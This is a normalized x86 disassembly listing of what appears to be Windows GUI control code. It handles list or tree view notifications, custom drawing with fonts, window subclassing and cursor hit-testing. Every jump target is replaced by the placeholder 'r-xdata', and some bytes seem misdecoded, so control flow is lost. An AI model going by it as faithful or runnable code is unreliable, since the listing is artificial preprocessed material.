lea edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43b264
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
cmp [ ebx + 0xc ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_403370
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_43b264
mov edi eax
test edi edi
je r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44dda4
test al al
jne r-xdata
sub eax 0xfffffe3d
je r-xdata
lea eax [ ebp - 0x4e ]
xor ecx ecx
mov edx 0x28
call sub_402b80
mov eax [ ebx + 0x24 ]
mov [ ebp - 0x4a ] eax
lea edx [ ebp - 0x4e ]
mov eax [ ebp - 0x4 ]
call sub_43b264
mov edi eax
test edi edi
jne r-xdata
lea edx [ ebp - 0x26 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0xc ]
dec eax
je r-xdata
lea eax [ ebp - 0x10 ]
call sub_406ab0
push eax
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
push 0xbc7b
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call PostMessageA
lea ecx [ ebp - 0x98 ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44d178
lea eax [ ebp - 0x98 ]
call sub_406ab0
mov [ ebp - 0x16 ] eax
movsx ecx [ ebp - 0x14 ]
movsx edx [ ebp - 0x16 ]
mov eax [ ebp - 0x4 ]
call sub_43af78
mov edx [ ebp - 0x4 ]
mov [ edx + 0x240 ] eax
lea eax [ ebp - 0x10 ]
call sub_406ab0
push eax
mov eax [ ebp - 0x4 ]
call sub_453e1c
mov ecx eax
mov edx 0x7b
mov eax [ ebp - 0x4 ]
call sub_44e7e8
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x240 ] edx
jmp r-xdata
test [ ebx + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43b264
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_403370
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
xor eax eax
mov [ edi + 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x330 ]
xor edx edx
call sub_430e28
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x8 ]
lea edx [ ebx + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_43b264
mov edx [ ebp - 0x4 ]
mov [ edx + 0x220 ] eax
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
lea edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43b264
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403370
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
mov esi ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x330 ]
cmp [ eax + 0x30 ] 0x0
jbe r-xdata
dec eax
je r-xdata
mov eax [ ebx + 0xc ]
sub eax 0x10001
je r-xdata
call sub_4039d4
jmp r-xdata
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xe0 ]
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
lea eax [ ebp - 0x90 ]
mov edx [ ebx + 0x1c ]
call sub_4040e4
mov edx [ ebp - 0x90 ]
mov eax edi
call sub_438950
jmp r-xdata
test [ ebx + 0xc ] 0x1
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
mov edx edi
call sub_439b84
jmp r-xdata
mov eax edi
call sub_439864
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x245 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_453e1c
call sub_429ae4
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x224 ] ebx
push 0xfffffffc
push ebx
call GetWindowLongA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x224 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
lea edx [ esi + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_43b264
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_403370
jmp r-xdata
mov ebx eax
xor edx edx
mov eax ebx
call sub_430e28
lea edx [ esi + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_43b264
mov [ ebx + 0xc ] eax
mov dl 0x1
mov eax ebx
call sub_430e28
jmp r-xdata
sub eax 0x27
je r-xdata
test [ ebx + 0xc ] 0x10002
je r-xdata
dec eax
je r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
test al al
jne r-xdata
xor eax eax
push ebp
push sub_43b44b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_424af0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_424990
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x170 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_4249ac
lea edx [ ebp - 0x26 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
mov [ ebp - 0x11 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor edx edx
call sub_424af0
retn
mov cl 0x1
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
test al al
je r-xdata
dec eax
je r-xdata
test [ ebx + 0xc ] 0x2
je r-xdata
mov eax [ edi + 0x8 ]
call sub_4043ac
mov edx eax
mov ecx [ ebx + 0x20 ]
dec ecx
mov eax [ ebx + 0x1c ]
call sub_408618
mov eax [ ebp - 0x8 ]
lea edx [ ebx + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_43b264
mov edi eax
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
mov si 0xffab
call sub_403370
jmp r-xdata
jmp r-xdata
xor edx edx
push ebp
push sub_43b7f5
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebx + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_424af0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_424990
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x170 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_4249ac
test [ ebx + 0x28 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x288 ] 0x0
je r-xdata
mov cl 0x1
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xe0 ]
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x20
mov cl 0x2
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_424968
retn
lea edx [ ebp - 0x26 ]
mov cl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
jmp r-xdata
mov cl 0x2
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
test al al
je r-xdata
dec eax
je r-xdata
test [ ebx + 0xc ] 0x20
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd8 ]
mov eax [ edi + 0x14 ]
mov [ ebx + 0x24 ] eax
cmp eax 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
mov si 0xffaa
call sub_403370
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov edx [ eax + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edx + 0xc ] ecx
mov [ edx + 0x8 ] sub_43c644
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov [ eax + 0x8 ] sub_43c644
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
push 0x0
lea eax [ ebp - 0x12 ]
push eax
mov cx [ ebx + 0x28 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
mov [ ebp - 0x11 ] al
cmp [ ebp - 0x12 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_423a44
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_424210
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28c ] 0x0
je r-xdata
push 0x1
lea eax [ ebp - 0x12 ]
push eax
mov cx [ ebx + 0x28 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xd4 ]
jmp r-xdata
mov cl 0x2
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xe0 ]
test al al
je r-xdata
dec eax
je r-xdata
mov cl 0x3
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x10
mov cl 0x1
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
test al al
je r-xdata
lea edx [ ebp - 0x26 ]
mov cl 0x2
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
jmp r-xdata
mov cl 0x3
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
test al al
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xdc ]
mov eax [ edi + 0x18 ]
mov [ ebx + 0x28 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403370
jmp r-xdata
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x10000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
push eax
call DeleteObject
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x288 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x28c ] edx
push 0x2
lea eax [ ebp - 0x12 ]
push eax
mov cx [ ebx + 0x28 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xd4 ]
jmp r-xdata
mov cl 0x3
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xe0 ]
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x40
jmp r-xdata
lea edx [ ebp - 0x26 ]
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x210 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x4
jmp r-xdata
push 0x3
lea eax [ ebp - 0x12 ]
push eax
mov cx [ ebx + 0x28 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xd4 ]
mov cl 0x1
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x20c ]
mov eax [ esi + 0xc ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov eax [ esi + 0x14 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov edi [ ebp - 0x8 ]
mov edi [ edi + 0x8 ]
mov eax [ esi + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423584
mov [ edi + 0x30 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov eax [ eax + 0x14 ]
call sub_424208
call sub_423584
mov [ edi + 0x34 ] eax
lea eax [ ebp - 0x8a ]
push eax
push 0x3c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov eax [ eax + 0xc ]
call sub_423a58
push eax
call GetObjectA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor edx edx
call sub_424af0
retn
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor edx edx
call sub_424af0
lea eax [ ebp - 0x8a ]
push eax
call CreateFontIndirectA
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x288 ] esi
push esi
mov eax [ ebx + 0x10 ]
push eax
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28c ] eax
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x2
sub_43bccc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ esi ] 0xbc7b
jne r-xdata
mov edi [ esi ]
cmp edi 0x201
je r-xdata
mov edx esi
mov eax ebx
call sub_451830
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0x7b
mov eax ebx
call sub_44e7e8
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax ebx
call sub_44dda4
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
cmp [ ebx + 0x9b ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_45179c
test al al
jne r-xdata
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
sub_43bd5a
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_44de18
mov esi [ ebx + 0x220 ]
xor eax eax
mov [ ebx + 0x238 ] eax
xor eax eax
mov [ ebx + 0x220 ] eax
test esi esi
jne r-xdata
test esi esi
je r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax ebx
call sub_44d178
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_43af78
mov esi eax
add esp 0x10
pop esi
pop ebx
retn
mov eax ebx
call sub_453e1c
mov edx [ esi + 0x10 ]
call sub_429b10
test eax eax
je r-xdata
mov ebx [ ebx + 0x21c ]
mov edx eax
mov eax ebx
call sub_45a8d8
push 0x2
mov ecx 0x2
xor edx edx
mov eax ebx
call sub_4558b4
sub_43bde4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44de38
xor eax eax
mov [ ebx + 0x238 ] eax
pop ebx
pop ebp
retn 0x4
sub_43be04
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4534d4
mov edi [ esi + 0x8 ]
mov al [ esi + 0x4 ]
dec al
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x18 ]
mov eax ebx
call sub_43b1f8
mov [ ebx + 0x238 ] eax
xor edx edx
mov eax ebx
call sub_43b230
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
jmp r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx edi
mov eax ebx
call sub_44d178
mov eax [ esp + 0x4 ]
push eax
cmp [ esi + 0xc ] 0x0
setne al
push eax
mov edx [ edi + 0x8 ]
mov ecx [ esp + 0x8 ]
mov eax ebx
call sub_43be8c
jmp r-xdata
dec al
je r-xdata
xor eax eax
mov [ ebx + 0x238 ] eax
jmp r-xdata
sub_43be8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_43af78
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_43b1f8
cmp esi eax
jne r-xdata
xor eax eax
mov [ ebx + 0x238 ] eax
mov ebx edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x18 ]
mov dl 0x1
mov eax esi
call sub_438fc0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
cmp esi [ ebx + 0x238 ]
jne r-xdata
sub_43bf2c
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x2ba ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_43bf58
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x285 ] 0x1
xor eax eax
call sub_464ca8
or al [ r-xdata ]
push eax
mov eax ebx
call sub_43b174
mov edx eax
mov eax ebx
pop ecx
call sub_43c894
cmp [ ebx + 0x2b2 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_43c008
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x312 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x314 ]
call [ ebx + 0x310 ]
sub_43c054
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x2ca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_43c080
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x2fa ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2fc ]
call [ ebx + 0x2f8 ]
sub_43c0ac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43c14c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax ebx
call sub_43b264
mov [ ebp - 0x8 ] eax
mov edi [ esi + 0x10 ]
test edi edi
je r-xdata
cmp [ ebx + 0x2aa ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4040e4
cmp [ ebx + 0x302 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c153
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x2ac ]
call [ ebx + 0x2a8 ]
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x304 ]
call [ ebx + 0x300 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_438950
jmp r-xdata
sub_43c15c
push ebx
push ecx
mov ebx eax
mov eax [ r-xdata ]
mov [ esp ] eax
cmp [ ebx + 0x32a ] 0x0
je r-xdata
mov ecx [ ebx + 0x26c ]
mov dl 0x1
mov eax [ esp ]
call sub_4387cc
pop edx
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x32c ]
call [ ebx + 0x328 ]
sub_43c1a8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_454120
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_453e1c
mov ecx edi
mov edx esi
call sub_4299b8
sub_43c1d0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_454120
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi esi
mov eax edi
call sub_45a7c8
test al al
je r-xdata
xor eax eax
mov eax edi
call sub_45a904
jmp r-xdata
cmp esi [ ebx + 0x260 ]
jne r-xdata
xor ecx ecx
mov edx eax
mov eax ebx
call sub_43c1a8
jmp r-xdata
cmp esi [ ebx + 0x234 ]
jne r-xdata
mov ecx 0x2
mov edx eax
mov eax ebx
call sub_43c1a8
sub_43c22c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44cb04
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x234 ]
jne r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_43c26c
xor edx edx
mov eax edi
call sub_43c2d4
sub_43c26c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x234 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x234 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x230 ]
call sub_45b294
xor ecx ecx
xor edx edx
mov eax ebx
call sub_43c1a8
pop esi
pop ebx
retn
mov edx [ ebx + 0x230 ]
call sub_45b2d8
mov edx ebx
mov eax [ ebx + 0x234 ]
call sub_420a98
mov eax [ ebx + 0x234 ]
call sub_45a904
mov edx eax
xor ecx ecx
mov eax ebx
call sub_43c1a8
pop esi
pop ebx
retn
sub_43c2d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x260 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x260 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x264 ]
call sub_45b294
mov ecx 0x2
xor edx edx
mov eax ebx
call sub_43c1a8
pop esi
pop ebx
retn
mov edx [ ebx + 0x264 ]
call sub_45b2d8
mov edx ebx
mov eax [ ebx + 0x260 ]
call sub_420a98
mov eax [ ebx + 0x260 ]
call sub_45a904
mov edx eax
mov ecx 0x2
mov eax ebx
call sub_43c1a8
pop esi
pop ebx
retn
sub_43c340
push ebx
push esi
add esp 0xffffffd8
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x8 ]
call sub_416cb4
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov edx esi
mov eax ebx
call sub_454f1c
test [ ebx + 0x1c ] 0x8
jne r-xdata
mov eax ebx
call sub_43b174
test eax eax
je r-xdata
add esp 0x28
pop esi
pop ebx
retn
lea ecx [ esp + 0x8 ]
movsx edx [ esi + 0xa ]
movsx eax [ esi + 0x8 ]
call sub_405f6c
lea edx [ esp + 0x8 ]
mov ecx esp
mov eax ebx
call sub_44d178
mov eax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
call sub_464d30
mov ecx eax
mov dl 0x1
mov eax ebx
mov si 0xffd3
call sub_403370
mov eax ebx
call sub_43b174
lea ecx [ esp + 0x18 ]
mov dl 0x1
call sub_439780
lea eax [ esp + 0x18 ]
lea edx [ esp + 0x10 ]
call sub_405fa8
lea edx [ esp + 0x10 ]
lea ecx [ esp + 0x8 ]
mov eax ebx
call sub_44d14c
lea eax [ esp + 0x8 ]
call sub_406ab0
mov [ esi + 0x8 ] eax
sub_43c3fc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x220 ] edx
xor eax eax
push ebp
push sub_43c4f8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44ecb8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5d ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c4ff
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x220 ] edx
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
movsx ecx [ ebx + 0xa ]
movsx edx [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43af78
mov ebx eax
test ebx ebx
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44d178
lea eax [ ebp - 0x18 ]
call sub_406ab0
mov [ ebp - 0x10 ] eax
mov dx [ ebp - 0xe ]
mov ax [ ebp - 0x10 ]
call sub_406a38
push eax
xor ecx ecx
mov edx 0x202
mov eax [ ebp - 0x4 ]
call sub_44e7e8
jmp r-xdata
mov dl 0x1
mov eax ebx
call sub_439048
mov dl 0x1
mov eax ebx
call sub_438ee4
or ecx 0xffffffff
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44dcdc
sub_43c504
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
cmp [ eax + 0x8 ] 0xfffffdee
jne r-xdata
mov edx esi
mov eax ebx
call sub_45212c
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax ebx
call sub_44d178
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
call sub_43af78
mov edi eax
test edi edi
je r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0xb4 ] 0x1
je r-xdata
call sub_437140
cmp eax 0x40047
jl r-xdata
lea eax [ ebx + 0x270 ]
mov edx [ edi + 0x8 ]
call sub_404718
mov edi 0x50
mov eax [ ebx + 0x270 ]
call sub_404738
cmp edi eax
jg r-xdata
mov eax [ edi + 0x8 ]
call sub_4041ac
cmp eax 0x50
jge r-xdata
mov eax [ ebx + 0x270 ]
call sub_404728
mov ebp [ esi + 0x8 ]
mov [ ebp + 0xc ] eax
lea eax [ ebp + 0x10 ]
xor ecx ecx
mov edx edi
call sub_402b80
mov eax [ ebx + 0x270 ]
call sub_404738
mov ecx eax
add ecx ecx
mov eax [ esi + 0x8 ]
lea edx [ eax + 0x10 ]
mov eax [ ebx + 0x270 ]
call sub_4028f0
mov eax [ esi + 0x8 ]
xor edx edx
mov [ eax + 0xb0 ] edx
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax ]
push eax
call SetWindowPos
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx edi
dec edx
lea eax [ ebx + 0x270 ]
call sub_404814
mov edx esi
mov eax ebx
call sub_45212c
jmp r-xdata
sub_43c64c
test cl cl
jne r-xdata
cmp dl 0x1
jne r-xdata
cmp dl 0x1
jne r-xdata
test dl dl
jne r-xdata
cmp [ eax + 0x2a2 ] 0x0
setne al
jmp r-xdata
test dl dl
jne r-xdata
